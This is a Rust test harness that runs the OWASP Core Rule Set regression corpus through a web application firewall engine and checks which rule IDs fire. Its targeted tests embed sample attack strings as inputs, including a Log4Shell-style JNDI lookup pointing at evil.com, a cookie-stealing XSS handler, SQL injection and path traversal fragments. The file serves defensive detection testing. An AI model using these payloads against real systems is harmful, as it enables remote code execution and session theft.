//! OWASP CRS behavioural regression harness.
//!
//! Reads the official go-ftw regression corpus from a local CRS clone, runs
//! each request through the full CRS rule set with the Varman SecLang engine
//! (in-process, no HTTP server), and checks the rule IDs the tests expect to
//! fire — or to stay silent.
//!
//! What is asserted: `log_contains`, `log.expect_ids`, and
//! `log.no_expect_ids` expectations. What is only counted/reported:
//! `status` expectations (the engine returns matched rules; mapping them to
//! HTTP statuses is the enforcement layer's job), multi-stage tests and
//! `encoded_request` tests (raw wire bytes, no persistence across stages).
//!
//! CRS location: `CRS_DIR` env var, else `../../references/coreruleset`.
//! When no clone is present the test skips, so builds without the reference
//! checkout stay green.

use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::path::{Path, PathBuf};

use serde::Deserialize;
use varman_waf::canonical::{Canonicalizer, RequestParts};
use varman_waf::seclang::ruleset::SecRuleSet;
use varman_waf::seclang::transaction::SecLangTransaction;

#[derive(Debug, Deserialize)]
struct TestFile {
    tests: Vec<TestCase>,
}

#[derive(Debug, Deserialize)]
struct TestCase {
    #[serde(default)]
    test_id: Option<serde_yaml::Value>,
    #[serde(default)]
    #[allow(dead_code)]
    desc: Option<String>,
    stages: Vec<Stage>,
}

#[derive(Debug, Deserialize)]
struct Stage {
    input: Input,
    #[serde(default)]
    output: Output,
}

#[derive(Debug, Deserialize, Default)]
struct Input {
    #[serde(default)]
    method: Option<String>,
    #[serde(default)]
    uri: Option<String>,
    #[serde(default)]
    headers: Option<BTreeMap<String, serde_yaml::Value>>,
    #[serde(default)]
    data: Option<String>,
    #[serde(default)]
    encoded_request: Option<String>,
    /// go-ftw: `false` disables client-added headers (Content-Length).
    #[serde(default)]
    autocomplete_headers: Option<bool>,
    /// HTTP version as sent (`"HTTP/1.1"` when omitted).
    #[serde(default)]
    version: Option<String>,
}

#[derive(Debug, Deserialize, Default, Clone)]
struct Output {
    #[serde(default)]
    log: Option<LogExpect>,
    #[serde(default)]
    log_contains: Option<String>,
    #[serde(default)]
    status: Option<u16>,
}

#[derive(Debug, Deserialize, Default, Clone)]
struct LogExpect {
    #[serde(default)]
    expect_ids: Option<Vec<u64>>,
    #[serde(default)]
    no_expect_ids: Option<Vec<u64>>,
}

fn crs_root() -> Option<PathBuf> {
    let candidates: Vec<PathBuf> = match std::env::var_os("CRS_DIR") {
        Some(dir) => vec![PathBuf::from(dir)],
        None => {
            let manifest = Path::new(env!("CARGO_MANIFEST_DIR"));
            vec![
                // Container-local clone first: the host copy may be locked
                // by Windows Defender (web-shells-php.data quarantine).
                PathBuf::from("/opt/crs-conformance"),
                manifest.join("../../references/coreruleset"),
            ]
        },
    };
    candidates.into_iter().find(|root| {
        root.join("rules").is_dir()
            && root.join("tests/regression/tests").is_dir()
    })
}

fn scalar(value: &serde_yaml::Value) -> String {
    match value {
        serde_yaml::Value::String(text) => text.clone(),
        serde_yaml::Value::Number(number) => number.to_string(),
        serde_yaml::Value::Bool(flag) => flag.to_string(),
        serde_yaml::Value::Null => String::new(),
        other => format!("{other:?}"),
    }
}

fn extract_id(text: &str) -> Option<u64> {
    let start = text.find("id \"")? + 4;
    let rest = &text[start..];
    let end = rest.find('"')?;
    rest[..end].trim().parse().ok()
}

/// Concatenate all CRS rule files in include order.
fn combined_source(rules_dir: &Path) -> String {
    let mut files: Vec<PathBuf> = fs::read_dir(rules_dir)
        .expect("read CRS rules directory")
        .filter_map(|entry| entry.ok().map(|entry| entry.path()))
        .filter(|path| {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            name.ends_with(".conf") && !name.ends_with(".example")
        })
        .collect();
    files.sort();
    let mut combined = String::new();
    for path in &files {
        let bytes = fs::read(path)
            .unwrap_or_else(|error| panic!("read {}: {error}", path.display()));
        combined.push_str(&String::from_utf8_lossy(&bytes));
        combined.push('\n');
    }
    combined
}

/// Official go-ftw test configuration from CRS
/// `tests/regression/README.md` (added to `crs-setup.conf` when running the
/// regression suite): enables the argument-limit checks and UTF-8
/// validation the tests assume.
const CRS_TEST_CONFIG: &str = "SecAction \"id:900005,phase:1,nolog,pass,ctl:ruleEngine=DetectionOnly,ctl:ruleRemoveById=910000,setvar:tx.blocking_paranoia_level=4,setvar:tx.crs_validate_utf8_encoding=1,setvar:tx.arg_name_length=100,setvar:tx.arg_length=400,setvar:tx.total_arg_length=64000,setvar:tx.max_num_args=255,setvar:tx.max_file_size=64100,setvar:tx.combined_file_sizes=65535\"";

/// Compile the full CRS rule set (test configuration + all files concatenated
/// in include order).
fn compile_full_set(rules_dir: &Path) -> SecRuleSet {
    let combined = format!("{CRS_TEST_CONFIG}\n{}", combined_source(rules_dir));
    SecRuleSet::from_source_with_base(&combined, Some(rules_dir))
        .unwrap_or_else(|error| {
            panic!("full CRS rule set failed to compile: {}", error.reason)
        })
}

/// Map rule ids to their declared `paranoia-level/N` tag (default 1).
fn paranoia_levels(source: &str) -> BTreeMap<u64, u8> {
    let mut levels = BTreeMap::new();
    let mut rest = source;
    while let Some(at) = rest.find("id:") {
        let after = &rest[at + 3..];
        let digits: String =
            after.chars().take_while(|c| c.is_ascii_digit()).collect();
        if digits.is_empty() {
            rest = after;
            continue;
        }
        let id: u64 = digits.parse().unwrap_or(0);
        // Stay inside this rule's quoted action list: the first `"` closes it.
        let limit = match after.find('"') {
            Some(position) => &after[..position],
            None => after,
        };
        if let Some(tag_at) = limit.find("paranoia-level/") {
            let tail = &limit[tag_at + "paranoia-level/".len()..];
            let number: String =
                tail.chars().take_while(|c| c.is_ascii_digit()).collect();
            if let Ok(level) = number.parse::<u8>() {
                levels.insert(id, level);
            }
        }
        rest = after;
    }
    levels
}

/// Run one test stage's request through the engine; returns fired rule IDs.
fn fired_ids(
    engine: &SecRuleSet,
    input: &Input,
    paranoia_level: u8,
) -> BTreeSet<u64> {
    let method = input.method.clone().unwrap_or_else(|| "GET".into());
    let uri = input.uri.clone().unwrap_or_else(|| "/".into());
    let mut parts = RequestParts::new(method, "localhost", uri)
        .with_http_version(
            input.version.clone().unwrap_or_else(|| "HTTP/1.1".into()),
        );
    if let Some(headers) = &input.headers {
        for (name, value) in headers {
            let text = scalar(value);
            // Apache rejects header names/values containing CR/LF before
            // ModSecurity ever runs (CRS 921140's expectation).
            if text.contains('\r')
                || text.contains('\n')
                || name.contains('\r')
                || name.contains('\n')
            {
                return BTreeSet::new();
            }
            parts = parts.with_header(name.clone(), text);
        }
    }
    if let Some(data) = &input.data {
        // Real HTTP clients send Content-Length with bodies, unless the test
        // opts out (`autocomplete_headers: false`).
        let autocomplete = input.autocomplete_headers.unwrap_or(true);
        let has_length = input.headers.as_ref().is_some_and(|headers| {
            headers
                .keys()
                .any(|name| name.eq_ignore_ascii_case("content-length"))
        });
        if autocomplete && !has_length {
            parts = parts.with_header("Content-Length", data.len().to_string());
        }
        parts = parts.with_body(data.clone().into_bytes());
    }
    let request = Canonicalizer::default().canonicalize(parts);
    let mut txn = SecLangTransaction::from_request(&request);
    // CRS's test application reflects request bodies (`/reflect`); response
    // rules (950–959 families) evaluate against that reflection. A JSON body
    // of `{"status": N}` / `{"body": "…"}` controls the reflected response.
    if let Some(data) = &input.data {
        let (status, headers, body) = reflect_response(data);
        txn.set_response(status, headers, body.into_bytes());
    }
    // Run at the paranoia level the expected rule declares, mirroring CRS's
    // per-level CI runs; 901's default-setting rules skip pre-set values.
    let level = paranoia_level.to_string();
    txn.tx_set("detection_paranoia_level", level.clone());
    txn.tx_set("executing_paranoia_level", level.clone());
    txn.tx_set("paranoia_level", level);
    engine
        .evaluate(&mut txn)
        .into_iter()
        .flat_map(|hit| hit.rule_ids)
        .flatten()
        .collect()
}

/// The CRS `/reflect` test application: a JSON body may set the response
/// status, headers and/or body; anything else is reflected verbatim.
fn reflect_response(data: &str) -> (u16, Vec<(String, String)>, String) {
    let mut headers =
        vec![("Content-Type".to_string(), "text/html".to_string())];
    if let Ok(value) = serde_json::from_str::<serde_json::Value>(data) {
        if let Some(object) = value.as_object() {
            let status = object
                .get("status")
                .and_then(serde_json::Value::as_u64)
                .and_then(|status| u16::try_from(status).ok())
                .unwrap_or(200);
            if let Some(extra) =
                object.get("headers").and_then(|h| h.as_object())
            {
                for (name, value) in extra {
                    let value = match value {
                        serde_json::Value::String(value) => value.clone(),
                        other => other.to_string(),
                    };
                    headers.push((name.clone(), value));
                }
            }
            let body = match object.get("body") {
                Some(serde_json::Value::String(body)) => body.clone(),
                Some(other) => other.to_string(),
                None => data.to_string(),
            };
            return (status, headers, body);
        }
    }
    (200, headers, data.to_string())
}

/// Join `\`-continuations and return the statement containing `id:<id>,`.
fn extract_rule_statement(source: &str, id: u64) -> String {
    let mut logical: Vec<String> = Vec::new();
    let mut current = String::new();
    for line in source.lines() {
        let trimmed_end = line.trim_end();
        if trimmed_end.ends_with('\\') {
            current.push_str(trimmed_end.trim_end_matches('\\'));
            current.push(' ');
            continue;
        }
        current.push_str(trimmed_end);
        logical.push(std::mem::take(&mut current));
    }
    if !current.is_empty() {
        logical.push(current);
    }
    let marker = format!("id:{id},");
    logical
        .into_iter()
        .find(|line| line.contains(&marker))
        .unwrap_or_default()
}

#[test]
fn targeted_singles_introspection() {
    let Some(root) = crs_root() else {
        return;
    };
    let cases: &[(&str, u64, &str)] = &[
        (
            "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
            941350,
            "/get/xx?id=%252bADw-script%252bAD4-",
        ),
        (
            "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
            941101,
            "/get/\"onmouseover='prompt(document.cookie)'\"",
        ),
        (
            "REQUEST-934-APPLICATION-ATTACK-GENERIC.conf",
            934100,
            "/get?foo=new+Function+%28",
        ),
        (
            "REQUEST-930-APPLICATION-ATTACK-LFI.conf",
            930110,
            "/get?a=..;.\\.;\\.",
        ),
    ];
    for (file, id, uri) in cases {
        let source =
            fs::read_to_string(root.join("rules").join(file)).expect("read");
        let statement = extract_rule_statement(&source, *id);
        assert!(!statement.is_empty(), "rule {id} not found");
        let mini = SecRuleSet::from_source(&statement)
            .unwrap_or_else(|error| panic!("mini {id}: {error}"));
        let request = Canonicalizer::default().canonicalize(RequestParts::new(
            "GET",
            "localhost",
            *uri,
        ));
        let mut txn = SecLangTransaction::from_request(&request);
        txn.tx_set("detection_paranoia_level", "1");
        txn.tx_set("executing_paranoia_level", "1");
        txn.tx_set("paranoia_level", "1");
        let hits = mini.evaluate(&mut txn);
        eprintln!("{id}: mini hits={}", hits.len());
        if hits.is_empty() {
            let values: Vec<String> = txn
                .resolve("ARGS")
                .into_iter()
                .chain(txn.resolve("REQUEST_FILENAME"))
                .chain(txn.resolve("REQUEST_URI_RAW"))
                .map(|value| format!("{}={}", value.name, value.value))
                .collect();
            eprintln!("{id}: values={values:?}");
        }
    }
}

#[test]
fn targeted_920450_fires() {
    let Some(root) = crs_root() else {
        return;
    };
    let engine = compile_full_set(&root.join("rules"));
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "User-Agent".to_string(),
        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
    );
    headers.insert(
        "Content-range".to_string(),
        serde_yaml::Value::String("test".to_string()),
    );
    headers.insert(
        "Accept".to_string(),
        serde_yaml::Value::String(
            "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
                .to_string(),
        ),
    );
    let input = Input {
        method: Some("GET".to_string()),
        uri: Some("/".to_string()),
        headers: Some(headers),
        data: None,
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    // Introspect the chain's TX state.
    let mut parts = RequestParts::new("GET", "localhost", "/");
    for (name, value) in input.headers.as_ref().expect("headers") {
        parts = parts.with_header(name.clone(), scalar(value));
    }
    let request = Canonicalizer::default().canonicalize(parts);
    let mut txn = SecLangTransaction::from_request(&request);
    txn.tx_set("detection_paranoia_level", "1");
    txn.tx_set("executing_paranoia_level", "1");
    txn.tx_set("paranoia_level", "1");
    let _ = engine.evaluate(&mut txn);
    let stored: Vec<String> = txn
        .resolve("TX:/^header_name_920450_/")
        .into_iter()
        .map(|value| format!("{}={}", value.name, value.value))
        .collect();
    eprintln!(
        "920450 debug: stored={stored:?} restricted={:?}",
        txn.tx_get("restricted_headers_basic")
            .map(|v| v.to_string())
    );
    let fired = fired_ids(&engine, &input, 1);
    assert!(
        fired.contains(&920450),
        "920450 did not fire; got {fired:?}"
    );
}

#[test]
fn targeted_943110_chain() {
    let Some(root) = crs_root() else {
        return;
    };
    let engine = compile_full_set(&root.join("rules"));
    // Test 4: same-host referer must NOT fire (chain member 3 rejects it).
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "Referer".to_string(),
        serde_yaml::Value::String("http://localhost/test".to_string()),
    );
    headers.insert(
        "User-Agent".to_string(),
        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
    );
    let input = Input {
        method: Some("GET".to_string()),
        uri: Some(
            "/get/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666"
                .to_string(),
        ),
        headers: Some(headers),
        data: None,
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    let fired = fired_ids(&engine, &input, 1);
    assert!(
        !fired.contains(&943110),
        "943110 false positive; got {fired:?}"
    );

    // Test 42: JSON session parameter name must fire.
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "Content-Type".to_string(),
        serde_yaml::Value::String("application/json".to_string()),
    );
    headers.insert(
        "Referer".to_string(),
        serde_yaml::Value::String("http://evil.com/".to_string()),
    );
    let input = Input {
        method: Some("POST".to_string()),
        uri: Some("/".to_string()),
        headers: Some(headers),
        data: Some("{ \"phpsession\":\"foo\" }".to_string()),
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    let fired = fired_ids(&engine, &input, 1);
    assert!(
        fired.contains(&943110),
        "943110 did not fire; got {fired:?}"
    );
}

#[test]
fn targeted_944150_json_evasion_fires() {
    let Some(root) = crs_root() else {
        return;
    };
    let engine = compile_full_set(&root.join("rules"));
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "User-Agent".to_string(),
        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
    );
    headers.insert(
        "Content-Type".to_string(),
        serde_yaml::Value::String("application/json".to_string()),
    );
    let input = Input {
        method: Some("POST".to_string()),
        uri: Some("/post".to_string()),
        headers: Some(headers),
        data: Some(
            "{\"foo\": \"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}"
                .to_string(),
        ),
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    // Introspect what the engine sees before asserting.
    let mut parts = RequestParts::new("POST", "localhost", "/post");
    for (name, value) in input.headers.as_ref().expect("headers") {
        parts = parts.with_header(name.clone(), scalar(value));
    }
    parts = parts
        .with_body(input.data.as_ref().expect("data").clone().into_bytes());
    let request = Canonicalizer::default().canonicalize(parts);
    let mut txn = SecLangTransaction::from_request(&request);
    txn.tx_set("detection_paranoia_level", "1");
    txn.tx_set("executing_paranoia_level", "1");
    txn.tx_set("paranoia_level", "1");
    let args: Vec<String> = txn
        .resolve("ARGS")
        .into_iter()
        .chain(txn.resolve("ARGS_NAMES"))
        .chain(txn.resolve("REQUEST_BODY"))
        .map(|value| format!("{}={}", value.name, value.value))
        .collect();
    eprintln!("944150 debug values: {args:?}");
    let fired = fired_ids(&engine, &input, 1);
    assert!(
        fired.contains(&944150),
        "944150 did not fire; got {fired:?}"
    );
}

#[test]
fn targeted_933150_mixed_case_fires() {
    let Some(root) = crs_root() else {
        return;
    };
    let engine = compile_full_set(&root.join("rules"));
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "User-Agent".to_string(),
        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
    );
    let input = Input {
        method: Some("GET".to_string()),
        uri: Some("/get?base64_deCOde()".to_string()),
        headers: Some(headers),
        data: None,
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    let fired = fired_ids(&engine, &input, 1);
    assert!(
        fired.contains(&933150),
        "933150 did not fire; got {fired:?}"
    );
}

#[test]
fn targeted_942410_regex_matches() {
    let Some(root) = crs_root() else {
        return;
    };
    let source = fs::read_to_string(
        root.join("rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"),
    )
    .expect("read rules file");
    let marker = source.find("id:942410,").expect("rule present");
    let before = &source[..marker];
    let rx_at = before.rfind("\"@rx ").expect("operator") + 5;
    let rx_end = before[rx_at..].find("\" \\").expect("operator end");
    let pattern = &before[rx_at..rx_at + rx_end];
    let regex = regex::Regex::new(pattern).expect("pattern compiles");
    assert!(
        regex.is_match("ABS("),
        "raw regex does not match ABS( (pattern len {})",
        pattern.len()
    );

    // Isolation: the same rule compiled alone, against the same request.
    let rule_line = format!(
        "SecRule ARGS_NAMES|ARGS \"@rx {pattern}\" \"id:942410,phase:2,block,t:none,t:urlDecodeUni\""
    );
    let mini = SecRuleSet::from_source(&rule_line).expect("mini compile");
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    let input = Input {
        method: Some("POST".to_string()),
        uri: Some("/post".to_string()),
        headers: Some(headers),
        data: Some("ABS(".to_string()),
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    let fired = fired_ids(&mini, &input, 2);
    assert!(
        fired.contains(&942410),
        "isolated rule did not fire; got {fired:?}"
    );

    // And the full set at PL2.
    let engine = compile_full_set(&root.join("rules"));
    let fired = fired_ids(&engine, &input, 2);
    assert!(
        fired.contains(&942410),
        "full set did not fire 942410; got {fired:?}"
    );
}

#[test]
fn targeted_942210_fires() {
    let Some(root) = crs_root() else {
        return;
    };
    let engine = compile_full_set(&root.join("rules"));
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "Content-Type".to_string(),
        serde_yaml::Value::String(
            "application/x-www-form-urlencoded".to_string(),
        ),
    );
    let input = Input {
        method: Some("POST".to_string()),
        uri: Some("/post".to_string()),
        headers: Some(headers),
        data: Some("var%3d%20@.%3d%20%28%20SELECT".to_string()),
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    // 942210 is tagged `paranoia-level/2`.
    let fired = fired_ids(&engine, &input, 2);
    assert!(
        fired.contains(&942210),
        "942210 did not fire at PL2; got {fired:?}"
    );
}

#[test]
fn targeted_944300_fires() {
    let Some(root) = crs_root() else {
        eprintln!(
            "crs_regression: no CRS clone found; skipping targeted check"
        );
        return;
    };
    let engine = compile_full_set(&root.join("rules"));
    let mut headers = BTreeMap::new();
    headers.insert(
        "Host".to_string(),
        serde_yaml::Value::String("localhost".to_string()),
    );
    headers.insert(
        "User-Agent".to_string(),
        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
    );
    headers.insert(
        "Content-Type".to_string(),
        serde_yaml::Value::String(
            "application/x-www-form-urlencoded".to_string(),
        ),
    );
    let input = Input {
        method: Some("POST".to_string()),
        uri: Some("/post".to_string()),
        headers: Some(headers),
        data: Some("test=cnVudGltZQ".to_string()),
        encoded_request: None,
        autocomplete_headers: None,
        version: None,
    };
    // 944300 is tagged `paranoia-level/3`.
    let fired = fired_ids(&engine, &input, 3);
    assert!(
        fired.contains(&944300),
        "944300 did not fire at PL3; got {fired:?}"
    );
}

#[test]
fn crs_regression_corpus() {
    let Some(root) = crs_root() else {
        eprintln!(
            "crs_regression: no CRS clone found; skipping (set CRS_DIR to run)"
        );
        return;
    };
    let rules_dir = root.join("rules");
    let tests_root = root.join("tests/regression/tests");
    let engine = compile_full_set(&rules_dir);
    let combined = combined_source(&rules_dir);
    let levels = paranoia_levels(&combined);

    let mut yaml_files: Vec<PathBuf> = Vec::new();
    for group in fs::read_dir(&tests_root).expect("read regression tests") {
        let group = group.expect("dir entry").path();
        if !group.is_dir() {
            continue;
        }
        for entry in fs::read_dir(&group).expect("read test group") {
            let path = entry.expect("entry").path();
            if path.extension().is_some_and(|ext| ext == "yaml") {
                yaml_files.push(path);
            }
        }
    }
    yaml_files.sort();

    let mut total = 0usize;
    let mut checked = 0usize;
    let mut passed = 0usize;
    let mut failed: Vec<String> = Vec::new();
    let mut failed_by_expect: BTreeMap<String, usize> = BTreeMap::new();
    let mut skipped_raw = 0usize;
    let mut skipped_multistage = 0usize;
    let mut status_only = 0usize;
    let mut unchecked = 0usize;

    for file in &yaml_files {
        let name = file
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default();
        let Ok(source) = fs::read_to_string(file) else {
            continue;
        };
        let Ok(parsed) = serde_yaml::from_str::<TestFile>(&source) else {
            eprintln!("crs_regression: unparsable {name}");
            continue;
        };
        for case in parsed.tests {
            total += 1;
            if case.stages.len() != 1 {
                skipped_multistage += 1;
                continue;
            }
            let stage = &case.stages[0];
            if stage.input.encoded_request.is_some() {
                skipped_raw += 1;
                continue;
            }

            let expected: Vec<u64> = stage
                .output
                .log
                .as_ref()
                .and_then(|log| log.expect_ids.clone())
                .unwrap_or_default();
            let forbidden: Vec<u64> = stage
                .output
                .log
                .as_ref()
                .and_then(|log| log.no_expect_ids.clone())
                .unwrap_or_default();
            let contains: Vec<u64> = stage
                .output
                .log_contains
                .as_deref()
                .and_then(extract_id)
                .into_iter()
                .collect();

            // Expected rules carry their paranoia level; run at that level.
            let level = expected
                .iter()
                .chain(contains.iter())
                .filter_map(|id| levels.get(id).copied())
                .max()
                .unwrap_or(1);
            let fired = fired_ids(&engine, &stage.input, level);

            if expected.is_empty()
                && forbidden.is_empty()
                && contains.is_empty()
            {
                if stage.output.status.is_some() {
                    status_only += 1;
                } else {
                    unchecked += 1;
                }
                continue;
            }
            checked += 1;
            let mut ok = true;
            for id in expected.iter().chain(contains.iter()) {
                if !fired.contains(id) {
                    ok = false;
                }
            }
            for id in &forbidden {
                if fired.contains(id) {
                    ok = false;
                }
            }
            if ok {
                passed += 1;
            } else {
                let test_id = case
                    .test_id
                    .as_ref()
                    .map(scalar)
                    .unwrap_or_else(|| "?".to_string());
                let expected_key = if !expected.is_empty() {
                    format!("expect {expected:?}")
                } else if !contains.is_empty() {
                    format!("contains {contains:?}")
                } else {
                    format!("forbid {forbidden:?}")
                };
                *failed_by_expect.entry(expected_key).or_default() += 1;
                let fired_sorted: Vec<u64> = fired.iter().copied().collect();
                failed.push(format!(
                    "{name} test {test_id}: method={:?} uri={:?} data={:?} expected={expected:?} contains={contains:?} forbidden={forbidden:?} fired={fired_sorted:?}",
                    stage.input.method, stage.input.uri, stage.input.data
                ));
            }
        }
    }

    eprintln!("=== CRS behavioural regression (full set, in-process) ===");
    let mut histogram: Vec<(String, usize)> =
        failed_by_expect.into_iter().collect();
    histogram.sort_by_key(|entry| std::cmp::Reverse(entry.1));
    for (key, count) in histogram.iter().take(15) {
        eprintln!("  fails {count:5}  {key}");
    }
    let dump_all = std::env::var_os("CRS_DUMP").is_some();
    for line in failed.iter().take(if dump_all { failed.len() } else { 10 }) {
        eprintln!("  FAIL {line}");
    }
    eprintln!(
        "regression: files={} tests={total} checked={checked} passed={passed} failed={} skipped_raw={skipped_raw} skipped_multistage={skipped_multistage} status_only={status_only} unchecked={unchecked}",
        yaml_files.len(),
        failed.len()
    );

    // Ratchet: raise only when the baseline genuinely improves.
    assert!(
        passed >= 5135,
        "CRS regression regressed: {passed} passed (baseline 5135)"
    );
}
